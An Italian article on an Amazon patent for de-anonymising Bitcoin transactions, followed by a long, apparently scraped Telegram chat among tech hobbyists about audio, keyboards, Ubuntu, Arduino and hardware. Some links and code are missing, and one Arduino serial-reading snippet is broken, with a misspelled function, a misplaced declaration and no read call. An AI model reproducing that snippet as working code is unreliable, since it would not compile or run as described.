È noto che la criminalità organizzata si nasconde dietro l'anonimato di questa moneta virtuale per condurre affari illegali come il traffico di droga, di armi e il riciclaggio di denaro sporco. Tuttavia, si è scoperto che la tecnologia della blockchain di Bitcoin non è completamente anonima. Amazon ritiene che con il nuovo brevetto, una quantità significativa di dati può essere sfruttata per aiutare a identificare coloro che sono dietro le transazioni bitcoin anonime.

Questo brevetto, che è stato recentemente rilasciato, è stato originariamente depositato nel 2014 e descrive un approccio completo sui dati che unisce i partner di Amazon insieme ad altri rivenditori globali e società di telecomunicazioni per collegare distintamente le transazioni bitcoin con indirizzi IP univoci e indirizzi di spedizione, come dichiarato da Consumer News e Business Channel (CNBC).

Il brevetto suggerisce che questo "flusso di dati" generato potrebbe essere successivamente utilizzato dalle agenzie governative per l'applicazione della legge e a fini fiscali.

In un esempio citato nel brevetto, la maggior parte delle agenzie governative e delle autorità fiscali potrebbe essere in un modo o nell'altro interessata a queste informazioni importanti che consentiranno il lavoro di deanonimizzazione, accedendo a un elenco di transazioni Bitcoin globali in ogni paese, etichettate con i dati degli ISP per determinare e accertare gli indirizzi IP delle transazioni.

Inoltre, secondo la rivista MotherBoard, la National Security Agency (NSA) ha riferito di essere riuscita a trovare un mezzo per identificare e monitorare gli utenti bitcoin negli ultimi sei anni.

Anche se questo brevetto Amazon può essere visto come un importante passo avanti e può anche sollevare accesi dibattiti tra coloro che sperano di rimanere anonimi nei loro rapporti con i bitcoin, sarebbe fondamentale notare che i soli indirizzi IP hanno dimostrato in passato di non essere sufficienti per condannare un sospetto in un tribunale. Inoltre, l'uso di Tor o di una VPN durante le transazioni con bitcoin dovrebbe rendere inutile il sistema brevettato da Amazon.

Amazon deve ancora fare una dichiarazione pubblica, ma il brevetto potrebbe probabilmente essere mirato alle implicazione fiscali dell'utilizzo di bitcoin nel commercio legittimo su siti online legittimi, piuttosto che per tracciare i commerci illeciti sulla Darknet.
non esistono 
Che cazzo è sto poema
Brutto amazon
Wikipedia lo dice ._.
La musica inibisce i miei freni
link
Non ti preoccupare
Ubriaco? Quanto ha bevuto?
dice che C è propriamente ad alto livello, ma ha anche funzioni di basso livello
(tipo l'accesso alla memoria)

Minchia comunque
quasi 50 anni di C
Fare IoT con C è un suicidio btw
al massimo con C++
Droppiamo un party ai 50 anni?
altrimenti senza oop è veramente un suicidio
un .party()

String x = IoT; cout << x.description << endl;
ma che cazzo
IoT è una costante??
anzi non può essere
No variabile
non ha senso x.description
se è un int
Shh
.-.
Sono abituato a swift
Dove puoi fare .localizedDescription
Non per JS 
.-.
._.
Vabbe
Cosa significa IoT?
._.--._.--._.
Internet of Things
Cioè?
Internet of Things, Internet delle Cose, ovvero domotica
non solamente
🅱🅱🅱
e qui 
 si triggera
Internet delle cose, in pratica tutti quei sistemi collegati ad una rete internet progettati per svolgere determinati compiti specifici(in pratica tutti quei progetti di noi makers)
.trigger(domotica)
mi sto triggerando anch'io ma non lo do a vedere
Ok, i’ m done
Mettila in un try catch block
Electron style 
why
Per allungare
Get user potrebbe non ritornare un valore
Credo almeno, non ho esperienza in java
se fosse sbagliata dovrebbe lanciare un exception
Mmm
Non conosco tanti linguaggi percio non saprei come funzionino
Ban
EH?
Scherzo lol
Ban
naBbo
Stai zitto 🅱️ufu
ufuBufu
non ditemi che si sta formattando
naah
ironico?
in pratica fa un analisi non formatta nulla
(anch'io quando mi è uscita la mia usb mi sono preso male)
ok
ma i bot telegram vanno?
si
il mio non riceve update
nulla, errore mio
 i soldi del refferal di Amazon ti arrivano anche se compro non solo da .it?
Non ho ancora fatto richiesta per gli stranieri 
che percentuale ricevi?
4%, ma meglio di un calcio in culo
Sono 4€ su 100€ mica male cioè
Ma se compro usando l’app come faccio ad usare il ref?
Sisi beh... Per il fatto che siano completamente sottratti ad Amazon e non dal compratore è assolutamente non male
Apri il link reffato e lo apri nell'app
Ben inception
shit dovevo fare un ordine abbastanza grosso dall'estero vedo se lo mettono anche su amazon italia
che schifo i povery
"ho preso 3 Titan Xp perché era notte ed ho cliccato troppe volte sul tastino +"
poi devo capire cosa se ne fa rocazzi di tutte quelle schede video
Si fa i porno in 8K realistici in Cinema4D
giuuustoo
Geniooooo
A friends advice to solve a memory leak in my game



by 
Best bugfix
ù.ù
100% risposta da un pro
ma seriamente?
Si hahahahaha
Ho visto il video
Pazzesco
Io non ho idea di che se ne faccia
posso non rispettare il regolamento e insultarlo beatamente?
Ed io che sto ancora aspettando 
Ahahahaha
Poi si triggera il bot
beh sono utili se hai robe da renderizzare oppure reti neurali eccetera... solo che Rovazzi una rete neurale non sa neanche cos'è, o se ce n'è una nel suo cervello
Eh ecco appunto
E lui sta ancora aspettando la 1070 o 1080 che gli ho promesso
Al paese mio si dice: "Criso da il pane a chi non ha i denti". Ecco, hanno ragione
3 titan xp 
Ma
EHIiiiiiiii
Producer Spotted 
FL 
Oh ca@
Hanno scoperto tutto
STACCAH STACCAH
Ci stanno stracciando

Ma è normale a circa due mesi da un esame avere incubi tutte le notti ???
sì
sisi, mi ricordo dalle medie 
Sono stato scoperto 
Io ho risolto così (per la maturità): non ho fatto nulla fino a due giorni prima, poi le notti non ho dormito perché dovevo studiare.
vuoi che ti butto di forza dentro al gruppo o ci entri da solo? 
Ahahahaha
seems legit
Io alla maturità ero tranquillissimo...
Beh all'orale avevo talmente sonno che non avevo la forza di avere anche ansia
Dammi il link che entro dai 
Medie o Superiori?
ma lol
...quando non costituirà prova di reato Vi racconterò cosa ho fatto poco prima dell'orale
Medie... Terza media
ma hahahahaah

Ah, stai passando lo stesso calvario delle prove parallele come me allora
No io prove trasversali... A 45 gradi per l'esattezza
ma stava scherzando hahahaha
Ah lel
Dai scherzavo... L'esame che devo sostenere è il comptia security + ... E ho 39 anni ... Forse sono il più vecchio qua dentro
... E fu il silenzio ...
tutti morti
Dio disse kung
e kung fu

Benveniuto
Grazie!! Mi presento: sono Michele e mi occupo da 20 anni di Building Automation e sistemi domotici. Ultimamente mi occupo di IoT. Ho 40 anni e attualmente sto cercando collaboratori per realizzare alcuni progetti. Nello specifico cerco programmatori web piu' backend con conoscenze in integrazioni telegram via API. Sono appassionato da sempre in tecnologia e sono anche videomaker e regista.
Classe 78?
Ho appena visto il video....🤤🤤🤤
Benvenuto!
Ruba le basi da yt in 1080p
Ciao Marco! Potresti dirmi dove hai ordinato tutti i componenti per il tuo drone?
Ordinando dal sito dji (ovviamente) si supera di gran lunga la cifra che hai speso tu (circa +150€)
Il kit l'avevamo preso da DTmodels (o qualcosa del genere) di Novara
non se ne fa niente, è diverso... Molta gente si fa i PC potenti per passione, non per sfruttarli effettivamente...
Anche perché secondo te io sfrutto al massimo il mio 6600k?
Grazie Marco....e compimenti per il lavorone che fai.
mi spieghi cosa è il sample rate e il bit rate?
solo perché è mp3 non è qualità massima
Spotify non comprime in mp3 ma in OGG Vorbis (che ha una qualità molto più alta dell'MP3)
Mmmm cha’dett?
ma poi il mio mp3 non li legge
Ma il sampling rate di Spotify mi pare che sia 44100, che senso ha cambiarlo, si perde qualità convertendo il file con un sampling rate diverso
cè pure il 48000hz
Forse alcune canzoni
Ma generalmente sono tutte 44100 a 320kbps (160 per Spotify Free)
Non legge gli OGG? Mazza che merda
hahaha cinesata
3euro
Ma
Usa il telefono
Calcola che un DAC (e solo il DAC, senza tutto il resto dell'hardware) di qualità costa sui 300€
Con 3€ che cazzo esce una suoneria monofonica di quelle stile Nokia 3310?
hahah
Comunque dovrei comprarmi un DAC (o scheda audio, come volete chiamarlo) perché non mi convince troppo quello della motherboard del PC
Io ho la Focusrite Scarlett
Sampling rate è il numero di sample per secondo, detto male la frequenza massima a cui può arrivare, 44100Hz (per non avere problemi di undersampling bisogna campionare ad almeno il doppio della frequenza originale)

Bitrate sono le informazioni che ha ogni secondo, più è alto e più è dettagliato il suono, moltiplicando il bitrate per il numero di secondi della traccia hai il peso del file.
Nei file lossless (senza compressione) il bitrate non è costante ma varia ad ogni istante, mentre in praticamente tutti i formati compressi è costante.
In un CD il bitrate varia attorno ai 1000kbps (valore preso da me dopo aver acquisito su file (non compressi) diversi CD)
capito
Mentre, per completare, il numero di bit (bit depth) (solitamente si usano 16 e 24 bit, i CD ne hanno 16, Spotify non lo so, ma un tizio al Maker Faire mi aveva detto 24) sono, detto malissimo, il numero di livelli di voume (quanti valori può assumere l'onda per ogni sample)
FLAC 24/96 forever❤
Ragazzi adoro quest'uomo
Linus che recensisce Sua Maestà IBM Model M
la regina delle tastiere meccaniche
 no vabbè chiudete l'internet
 ti rendi conto?????????????????????
Quindi, riassumendo tutto:
Se per esempio sto convertendo un vinile in un file wav (16 bit 44100Hz): vado ad analizzare l'onda (analogica) prodotta dal vinile 44100 volte al secondo (sampling rate), e ogni volta che la analizzo gli do un valore che può andare da 0 a 2^16.
Il problema qual'è, l'onda reale varia ogni istante, se dovessi salvare su un file ogni singolo istante dell'onda, oltre ad essere fisicamente impossibile avrei un file che peserebbe infiniti byte.
Per quanto riguarda il sampling rate, c'è un teorema che dice che campionando al doppio della frequenza che un essere umano può udire (20kHz) non abbiamo differenze che l'orecchio possa notare (ti mando un grafico se hai dubbi).
Il problema resta con il bit depth, noi ad ogni sample diamo un valore da 0 a 2^16 (16 bit), valore che potrebbe (anzi, quasi sicuramente) corrispondere a quello reale, creando così un errore di quantizzazione. Più il bit depth è alto, e meno l'errore è udibile.

Ho risolto i vostri dubbi?
AHAHAHAHAHAH
giusto per fare invidia, mio fratello con il suo fisso usa una tastiera uguale identica a quella 
E poi ci sono io con la MasterKeys... Della serie 
tuo fratello è una brava personanon come tutti quei ragazzacci con le loro tastiere rgb
*si sente triggerato*
quella tastiera ha la mia stessa età..1987
io odio gli rgb
Li metto sempre bianchi

anche tu sei una brava persona allora
usa quella tastiera solo perché è meccanica e va da dio
Però è RGB a 6 zone la mia
non come 
 che su quella cinesona ha i led stile discoteca anni 80 vero Marco?
E non è meccanica
Come la definisce Cooler Master per fare marketing, è "mem-canica"
la Model M ti accompagna anche nella bara, è indistruttibile  peggio degli M1 Abrams
io ho un portatile con tasteira retroilluminata bianca (non rgb)
Legende narrano sia fatta dello stesso materiale dei Nokia 3310

comunque a 0:24 del video potete vedere la mia tastiera meccanica..la mitica Filco Majestouch
 molto probabile
Beh beh ha il suo perché
Quelli li puoi usare come crick per i furgoni 
cosa???? questa non la sapevo..internamente ogni tasto ha una molla che si adatta al tipo di battuta e si comprime in base alla forza con cui si schiaccia il tasto??? 70gr di attuazione ragazzi, porca miseria..altro che Cherry Black, qua ci vogliono le dita di ferro e le fettine di cavallo

lo sai che scherzo..però una bella Model M con il pc nuovo ci starebbe bene
In realtà a quanto ho capito avrò periferiche sia coolermaster che msi
🤔 e come mouse?
Periferiche
Quindi boh
l'ideale nel tuo caso sarebbe un MX Master, oppure un Kensington
Che bello fare gli influencer
Poggiapolsi in legno
 giusto per non farsi mancare nulla
Etichetta riporta "lexmark international inc. 1985"
 oddio è proprio lei, l'originale con il PS2
mamma mia che invidia
Già, proprio lei
E nel caso cambi mobo e quindi non abbia piu la possibilità di usare il connettore ps/2, in giro per casa dovrei avere diversi adattatori per collegarla all'usb
si infatti, quello è un non-problema..2€ di adattatore
Ne ho una manciata in giro per casa, forse piu di cinque tra quelli verdi per tastiera e quelli viola per mouse
Ah, ho anche uno o due mouse di quelli con la sfera in gomma, ma non sono utilizzati a differenza di quella tastiera 
vabbè, quella è immortale 
io stavo pensando di prendere anche quest'altra leggenda, se la trovo ad un buon prezzo in qualche asta
Bhe DAC e scheda audio non sono proprio la stessa cosa però
Registri? Voce o strumenti?
M-Audio M-Track Plus, Focusrite Scarlett, oppure meglio ancora Steinberg UR22...oppure un buon mixer
Mixer non mi serve (anche se visto che ogni tanto mi autodefinisco DJ quando facciamo serata con gli amici e mixo con la console virtuale ma ok), cercavo più una scheda audio vera e propria, da quello che ho capito esterna sarebbe meglio
allora decisamente la Steinberg, è la migliore
Mica male il prezzo
Mi aspettavo qualcosa come 300€
Ci potrei fare un pensierino, anche perché dovrei avere qualcosa come 200€ tra i risparmi
ottima a quel prezzo
Che ci fai?
Vedo una mela...
Ascolto musica
scheda audio esterna per amplificare l'audio di microfono con cannon-jack e l'audio delle casse
No, quello lo sapevo
è la vecchia tastiera Apple..quando ancora facevano prodotti seri
Nel senso...
125
Eh quando? Ahahahahc
Del mic me ne faccio poco perché ho un Samson Meteor che è USB, ma fa comodo avere il supporto, non si sa mai che mi improvvisi cantante 
anni 90, primi anni 2000
vabbè, il Cannon c'è  volendolo usare in futuro è sempre li
Ahahahahah
Cannon? IL cannone dici?
È quel tipo di jack
Ma io scherzo, mi hai mai sentito cantare?
Ecco, meglio.
Ahahahahah
Porcoddue ho fatto quittare tutto il teamspeak di Minecraft ITALIA una volta
E da quel momento ho capito che il mio futuro era ben diverso.
Stai messo così male? Ahahah
Esattamente

sisi infatti ho scritto "Massima qualità per gli mp3"
anche se si puó inpostare il FLAC, volendo

Lol
 lol
But a programmer said something's wrong (x-post /r/fortnitebr)



by 
Ahahah onesto
Buongiorno bellezze
Buondì
Buongiorno caro
Buongiorno! 
L'ha fatto con me
Voice
QUANTO È BELLA
vero? quando ancora Apple faceva cose buone
Dite che conviene montare la partizione di Windows su Ubuntu?
Il DAC è una parte della scheda audio

Meccanica che bella....
invece di quelle nuove orrende e più piatte di una ballerina di danza classica
Raga
Ee
.b
Ho sbagliato: .a
.b
C.
B.
1979.
Giusto... 1+2 != 4 ahaha
E che costano 200€
Scusa non capisco
PH3 -> l'idrogeno è meno elettronegativo del fosforo e prende +1 -> +1 * 3 = +3 -> quindi il fosforo è -3! Il che esclude le possibilità a. e b.!
HPO2 -> l'idrogeno è sempre +1, l'ossigeno è -2 * 2 = -4 -> -4 + 1 = -3 cariche che restano sull'ossigeno -> di conseguenza il fosforo è +3! Il che esclude anche la risposta d.!
Quellla corretta è la C! Perchè quella risata?
Ragazzi pareri su questa guida? 

Io avevo detto .a però c'era un +2 non un +3
Ah scusa, allora... avevo capito male il commento... pensavo che la tua risata fosse indirizzata alla mia risposta
e non che fosse autocritica
pardon
Nope
ma non è vero mai nella vita
Ubuntu su un intel Duo e 8 Gb ram va bene o devo puntare a distro più leggere?
dovrebbe andare egregiamente
Cambio subito
Perfetto allora
Oggi metto il dualboot
esattamente
Ho installato venerdì Kubuntu 18.04 su un E6550 con 8 gb di ram... non l'ho provato a dovere, però va...
Forse abbiamo lo stesso processore
In dualboot?
si
con windows 10
Ah hai aggiornato, io lascio Win7
si è una macchina che uso come secondaria.. ci faccio di tutto... facendo assistenza hw e sw mi chiedono le cose più assurde
quindi la uso per sperimentare
The same, ce è lì a casa inutilizzata però è un'ottima macchina per quello che era
Si infatti, ma ad 
 devi ascoltare la musica e non registrare o usare microfoni, conviene prendere un DAC puro invece di una scheda audio tipo quelle che ti sono state consigliate, a parita di prezzo hai una qualità migliore, poi bisogna vedere che file ascolti e con cosa dopo il DAC, ampli? Cuffie o casse? Io ad esempio come dac sui 150 andrei di schiit
Penso sia ampli che cuffie
Anche se alla fine l'amplificatore che sta in salotto ha un DAC integrato... Quindi uso quello, lo userei soprattutto per le cuffie
Quindi che cuffie hai? E che ampli per cuffie hai?
Sennheiser HD 4.20s, ampli per cuffie no perché non serve, hanno un'impedenza di 18ohm
Per quanto riguarda l'amplificatore per le casse, ho uno Yamaha (non mi ricordo il modello), e ha anche un DAC integrato perché ha l'ingresso digitale (SPDIF)
Ok allora io andrei di DAC puro, quanti vorresti spendere?
Pensavi schiit modi 2, Smsl Sanskrit 6, Topping D30 DSD o JDSLabs ODAC
.-.
gg
Vedo che prima si parlava di tastiere d'epoca, quindi vi invio sta mummia
Una mitsumi
Ma è mecha?
Ho un Ubuntu 16.04 LTS su 4GB di RAM e un i3 
C'è un modo per leggere numeri interi dal Monitor Seriale di Arduino?
Eh?
grazie
Serial.println(int)?
Cioè mi spiego, riesco a leggere con 
() una sola cifra, mentre se metto per esempio 23 mi legge solo il 2 e non il numero per intero, c'è un modo per farlo?
() funzica solo con 1 byte alla volta, al massimo puoi fare un codice che sia fatto apposta per prendere numeri a 2 cifre o cose del genere
ma in generale 
() lo usi se il valore che ritorna è una cifra unica o una lettera unica
puoi fare tipo così :
while (Serial.avaible()) { 
  delay(3);  
  if (Serial.avaible() > 0) {
    char c = 
();
    string str += c;
  }
}
e poi converti la stringa "str" in un int
direttamente facendo:
int numero = str.toInt();
Io volevo metterci 18.04
 qui Marco lo spiega bene
Raga microSD ad alta velocità sandisk è buona?
cosa vuol dire "alla velocità sandisk"?
ah letto male
Dipende dalla classe
dipende da cosa ti serve, se intendi come qualità sicuro, se ti serve velocità dipende quanto veloce è
Le SD di SanDisk sono ottime, per la velocità però devi fare riferimento alla classe
Ma è un trip mentale

che differenza:
- 

- 
che su una c'è scritto pro e sull'altra no....in realtà io non ho mai cagato le sd, prendo sempre la prima accaso che vedo di solito
basta che sia della sandisk per quel che mi riguarda
Io nel raspi
Ho una sandisk
E funziona a dovere
Invec nel telefono ho una kingstone
Idem
Le mie durano due mesi e poi si friggono...
Adesso uso quelle cinesissime marce da 8giga comprate a 4€ l'una in fiera
Nuovo video! 
 

 
 
Guardalo ora! 
La scritta collaborazione msi mi piace 
Notata anche io
Busted 
Me lo son perso, grazie mille
Ovviamente anche agli altri
COS DOVE SPOILER
l'hai pubblicato ai patreon?
Lavagna bianca in altp a destra
Nel video
Ah giusto che con la testa coprivo solo la colonna centrale

Domanda: la partizione per Ubuntu quanto deve essere grande minimo?
Youtuber sad story
anche 15gb
3? Ahaha ho una partizione per il disco di ripristino che sbatta
non penso 
Ci devo pensare
Dice "Pagina non trovata"... E' lo Xiaomi Mi note 3 comunque
Ddcisamente il migliore il Mi Note 3! Vi scrivo da quello!
E' necessario cambiare ROM?
Ciao ragazzi, ma che cosa è successo ai prezzi delle SSD?
Sono calate tantissimo sia quelle normali che quelle NVme
Shit 
 il bot non va
è banggood che fa casini, anche con Scontino
HAHAHAAHAHHAHAAHAH
Come no?
Leggi il gruppo development
Letto
Chiedo scusa 
, ecco il link 
Categoria: Animali
Why?????
Guarda chi sta parlando 
Homini lupus
COS
In python è possibile accedere ad una classe dal nome di una variabile?
In modo che  :




sia uguale (in questo caso) a : 


?
sistemato
Che cazzo youtube
Whaaaaa (non ho capito)
sei tu che imposti la categoria quando carichi, mica youtube 
login è un nome a caso 

Potresti mettere tutto in un dizionario
Cioè?
Sarebbe sta roba
sinceramente Android nelle TV Box lo vedo poco utile
piuttosto un bell'Android TV, che è sempre Android ma molto più leggero ed ottimizzato per le TV, e su Android TV c'è Netflix in 4k HDR e con il supporto al Dolby Digital, su Android "normale" no, solo FHD.
 quel TV box è 4k upscaled o 4k reale? È anche Dolby Digital?
Ah... Android normale allora è stereo non 5.1
ROMBOLI MA COS'È QUELLA MENATA 
Su Android TV anche Dolby Digital, su Android normale no
Ma lascia stare ahahahaha
Sisi infatti
ma tu ci speri anche?
fixed
Ah menomale 
Android normale a 6 canali audio?
A sto punto prenditelo Xiaomi
assolutamente no
non penso lo supporti manco collegando una scheda audio tramite OTG, la vedrà sicuramente solo come PCM (2 canali stereo)
Si sono rotte le cuffiette...aiutatemi
Il PC collegato all'amplificatore risulta "multichannel" quindi PCM
PCM è anche 6 canali
Tipo la TV è PCM ma rai 1 hd le voci le sento solo sulla centrale
azz, che modello?
No vabbè, quelle che mettono nella confezione dell'iPhone
ah l'ho scoperto ora
Godo
Problema: cerco di installare Ubuntu ma non mi esce l'opzione per l'affiancamento con Windows
pensavo che PCM supportasse solo due canali
Ma cosa vuoi?
Non ne sono certo, ma credo che multichannel sia PCM
Strano....
Versione?
LTS 16.04
di solito si usano DTS o Dolby Digital per il surround
Il disco è in dual?
Nel senso...
Hai spazio nella partizione libera?
Sto pensando di guardate l'etichetta della partizione che ho fatto e selezionarla con l'opzione altro
Non so perché ma tramite HDMI va in multichannel anche se lo vorrei in dts
Appena lo collego vedo cosa succede con un video 5.1 e il passtrough abilitato su VLC
Ho una partizione da 20000 Mb come consigliato da Aranzulla
Io ho usato tutto lo spazio di D: 🤷‍♂
Pfff con Che hai scritto la chiavetta?
Quanto é Figo
Yumi
Che?!
Avevo quello sottomano
Questo mi è nuovo....
È uguale a Rufus
Ti consiglio comunque di usare etcher
Prova a metterci una versione più vecchia o ad aumentare la partizione
Fammi sapere
Però strano
Adesso ti linciano
20 Gb di partizione dovrebbe starci tutta
Teoricamente si
Ma spe
Ho una partizione non allocata, devo dargli delle etichette?
Che poi Ubuntu è forse quello più facile da mettere in dual
No
Teoricamente basta che selezioni
d'accordissimo
Aspè...
È la prima volta con Linux?
Si
Eh
Prova ad entrare in live
LIVE
Provato
Entri Easy?
Ad installarlo in live dalla scrivania
Yas
Allora fai così...
Entra in Linux Italia, vedi cosa ti dicono loro
Avrai sbaglio qualche passaggio
Anche se mi sembra strano
Perché alla fine l'installazione è Easy
Devo entrare nel bootloader e selezionare la chiavetta o dovrebbe fare da solo
Devi mettere prima quella di Windows
Poi selezioni modalità persistente
Boh non so che pensare
Ho chiesto al mio gruppo open vediamo che riesco a fare
Ma sei sicuro che va lasciata come memoria non allocata?
Si
Perché sennò come fai?
Secondo me è questa
Però è inusabile
Scusa eh
Vai su Windows
E vedi le partizioni
gienta, stavo pensando, qual'è il formato di immagine che non è compresso in alcun modo...del tipo che è direttamente un insieme di informazioni sul colore del singolo pixel?
Raw credo
mo' do un'occhiata
Ragazzi idee per magliette scientifiche divertenti?
Io ne ho un paio
Atomo #1 : "OH NO HO PERSO UN ELETTRONE!"

Atomo #2  : "Suvvia, sii positivo!"
Non ammazzatemi vi prego

Mi piace questo gruppo 
Sono anche un fan da un anno 
Per me è De l'hopital
Nope
È sempre lui
Meno lo si usa meglio è
Ma è così dolce e coccoloso
Taylor di più
Meglio questo dell freddura di prima
Che dite voi?
Yaaaaay
Finché sono funzioni easy
E le VGA scendonoooo
Mettersi a derivare 20 volte non è bellissimo
🤤
Easy con de l'hopital
Se hai il prodotto di merde al numeratore, deriva tu...
Con Taylor sviluppi singolarmente
Sono proprio belli i limiti
Lo so
Che macbook pro è? Immagino 13 pollici.
^
Se aspettavi un mese potevi prendere quello da 4 core
Raga
I7 o ryzen7?
Gaming/programmazione...
sinceramente....gli i7 sono dei tostapane
Contate che li overclocko a schifo proprio..
5.5/4.3 GHz arrivooo
Quindi secondo voi??
se l'i7 è un tostapane già di suo, a meno che tu non voglia divertirti a fondere silicio, vai di ryzen
Ovviamente raffreddamento a liquido a 2/3 ventole...
Le temperature non sono un problema
fidati che lo saranno
Mmmm
Dubito
Ventole da un miliardo di RPM e passa la paura
haha, sei fortunato se sta sotto i 110°
Faccio l'overvolt delle ventole
Ma ma ma

se prendi un i7, anche il più depotenziato(come quello che avevo io) finisce che con un raffreddamento a liquido tieni sui 100° fisso
Impossibile
ora con l'i5 6600k overclockato tengo 30°
Come cazzo fanno con gli i9?!?
Accendono il condizionatore
ma haha, quelli sono direttamente delle stufette, ci riscaldi casa con quelli
Ahahhahahhhahaha
Però con quello ci hackeri la NASA cazzo
Sono molto simili agli exeon
naah, al massimo ti ci riscaldi il pranzo

Insomma tu voti ryzen
O sbaglio?
Però per il gaming é meglio Intel........
beh, non ho esperienze su ryzen in realtà, però vedo che tutti lo consigliano e se l'altra opzione è i7 allora ogni cosa è meglio
pff, quello valeva ai tempi degli FX, ryzen va bene per il gaming
Ok...
Forse hai ragione
Ma non ne sono ancora convinto
Adioss
prenditi che ne so, un ryzen 7 1800x e via
Io ho messo la eu... Mi ci trovo benissimo
Io vorrei prendermi il macbook pro 13 pollici per programmazione, poi ci attacco il monitor da 27 pollici per avere più schermo, secondo voi faccio male?
Prezzo?
Vorrei tenere il budget sui 2099
Alla faccia
ione* 
Forse trovi qualcosa di meglio con altri computer
Mi serve macos
E non voglio prendermi un hackintosh per il problema delle ventole
Poi vedi te i soldi sono tuoi e decidi te secondo i tuoi gusti, ovviamente
Problema delle ventole?
Il problema è hackintosh
Per cosa ti serve?
BitMap penso
Si
Programmare scuola terminale unix
Linux distro?
Ma se tipo ti metti windows cosa ti esce li
(Nulla no?)
Xcode è imbattibile
Elementary, arch, Debian
Ha xcode? Non credo
 
 mi dispiace, finché saró in giro per trento come voi, vi spotteró
Beccato
🤣
Non ho capito cosa cambi da telegram a telegram X
Ahahah
Dopo passa a salutare
Certo!
Ahahahahahahah
Cosa vuoi capire?
Ti dico in privato
(Ho enunciato le differenze principali e importanti aha)
Prima lezione di grafica digitale, evitare times new roman ma soprattutto abolire comic sans...
Sii come nooo
: 
even Peeks uses Comic Sans 
mi è scappato il font in un video e sono esplosi i commenti
Allora mi sa che sono io il più vecchio
Oddio che ho scoperto 
When? Then
Where? There
What? That
Qualche sviluppatore esperto in integrazione Telegram???
Intendi il login con i Bot?

🤯

Che problema hanno?
Dal l’aggiornamento della compatibilità con gpu esterne le ventole girano al max tutto il tempo
gg
alla fine l'hanno fatto
L'hai visto?
 immagino sia dura gestire e lanciare un canale yt, ma vedo che dopo il muro dei ventimila i guadagni ci sono
Ok niente, non vi interessa: rifiutato. Aspettiamo direttamente la stampante 3D da GearBest, allora (speriamo accettino 🤞)
Meglio se prepari il draw my life per i 50'000
Per una stampante da 150€?
Beh ma è praticamente gratis no?
Si ma non puoi considerarli guadagni 
HAHAHAHA, è la vita sto video
Per uno studente tirchio come me lo sono, fidati
Anche la roba di Smallrig erano tipo 500€ ma non ci pago la spesa al supermercato o la benzina 
beh...beh...beh...puoi rivenderli
E Youtube non paga un cazzo, ti assicuro... Per quello attività affiancate tipo Patreon sono essenziali 
Si beh ma il punto è ROBA GRATIS!
eh già, tutti su iutub finlandia d'ora in poi
Poi sinceramente per fare i sordi quelli veri non penso youtube sia la scelta giusta
adesso lo invio a mio cugino in ucraina, voglio la sua reazione
Su patreon puoi chiedere anche donazioni per lo sviluppo di app?
Non ho mai capito come funziona, scusate l'ignoranza 
beh online o ci lavori, o sei uno iutubbber, o sei uno streamer(probabilmente quello che guadagna di più di tutti dalle donazioni), o stai sui blog e scrivi articoli guadagnando 7 euro al mese
non è che "chiedi per una cosa", molto semplicemente dici "hey, io sto facendo questa cosa qui, se mi 
 vi ripagherò il favore in qualche modo" e quindi se sviluppi un'app gliela devi dare in anteprima e gratis alla fine e nel frattempo anche preparare qualcosa per chi paga, non solo il progetto principale, tipo ora overvolt con le magliette e roba del genere
Circa
ma alla fine se sei abbastanza conosciuto riesci a sfruttarlo bene, tipo gli youtuber, guarda tipo yotobi che giusto oggi ha aperto il suo di patreon, per il suo nuovo studio....si, sta per traslocare un'altra volta, e sempre per lo stesso motivo, si è accorto che lo studio che si è fatto adesso era 'nammerda e vuole rifare tutto daccapo
Quand'è che ti danno lo yatch da recensire?
fai la recensione dei soldi direttamente
Ma io credevo che facesse altro in quello studio
tipo?
Lui mica è un geometra?
haha, è uno youtuber, ricorda ._.
O le Volvo da 100k€ come Toto
Nah,
Si ti prego
no comunque lui non vuole manco avvicinarsi a fare il geometra, ora per guadagnare e farsi un po' di fama va per l'italia a fare i suoi teatri, voglio dire....non sta proprio nell'ambito
Domanda per 
: e dopo che ti sei laureato? Youtuber o ingegnere?
a cazz, stavo per chiamarlo, il fuso orario, la è notte fonda ora
e vabb, domani

Ti so dire in luglio, ricordati 
Aspettatevi cose
 se vuoi farti finanziare per lo sviluppo di un'app forse è meglio kickstarter che patreon, il primo è letteralmente un "mi servono i fondi" il secondo è più una serie di donazioni volontarie senza dei veri e propri rientri
Laurea breve e basta?
Io direi youtuber ingegnere
eeeesatto
come yotobi, dopo la laurea vai a fare teatro anche se ti sei laureato in tutt'altro
Io ho una 1070 e un hackintosh e non ho questo problema
Io ho sentito questo
eee tipo non esiste un qualche programma per regolare le ventole?
Io uso iStat
gg
Che ha studiato Karim?
geometra in teoria
Domani voglio la risposta 
 è necessario aggiungere 5.2 € per l'assicurazione sulla spedizione?
Yeeee
Dalla Cina con furore
Sito?
Banggood
Nono
Ma i sonon?
Yes
Non dovresti beccare la dogana con bg
Ora c'è da scegliere se passarmi il tempo a creare il server o usare quello sonoff
Mi sa che per ora farò sonoff
Ok, grazie. Ho acquistato lo Xiaomi Mi Note 3 con il referral di overVolt.
Ahahahahahah
Grazie 
Abbandona YouTube...quanti può durare ancora? Si realista....
Grazie, davvero.
Scusate ragazzi ma i sonoff si possono impostare in modo che chiudano il circuito per poco e lo riaprano subito dopo (mi serve per un cancelletto e serve corrente solo un attimo)
Che bello il design dell’iPhone
AHAHAH
Avrei da ridire sulla tastiera
Gioele se non la usi spediscimela..ti pago la spedizione e la metto insieme alle altre nella collezione
Se vuoi a scuola ne abbiamo una 50ina
Noi abbiamo le logitech Bluetooth
Tipo mx master etc
l'Mx Master a scuola? ma dove studi, al MIT?
mandamene una
No, facciamo video editing in lab
ottimo
Raga ma dove si trova il file .config/user-dirs.dirs in ubuntu?
O come faccio a modificarlo
Quando ti dimentichi il portatile acceso...
Io ultimamente ho il brutto vizio di mandare il portatile in standby invece che spegnerlo solo per non dover riaprire programmi con vari file ad ogni avvio, quindi il pc lo spengo/riavvio solo quando hi problemi con winzoz o sono particolarmente in vena
Perché brutto vizio?
Standby e ibernazione esistono per questo
non farlo mai su un ssd
Sempre 
Standby è come spegnere ma resta tutro caricato in ram e se finisce la batteria perdi tutto, ibernazione è come spegnere ma salvi tutto su disco e toglie alimentazione a piu periferiche dello standby. Solo che ibernazione è una brutta bestia
si rovina l'ssd così..l'ssd non va mai e poi mai ibernato, va sempre spento..piuttosto lascia acceso il portatile se lo tieni a casa
Cos
Really????
Il portatile non lo iberno, è il fisso
Nah, gli consumi qualche ciclo di scrittura, e gli SSD ne hanno pochi
Io lascio sempre il computer in standby 
Standby non fa niente
Lo standby tiene le RAM alimentate
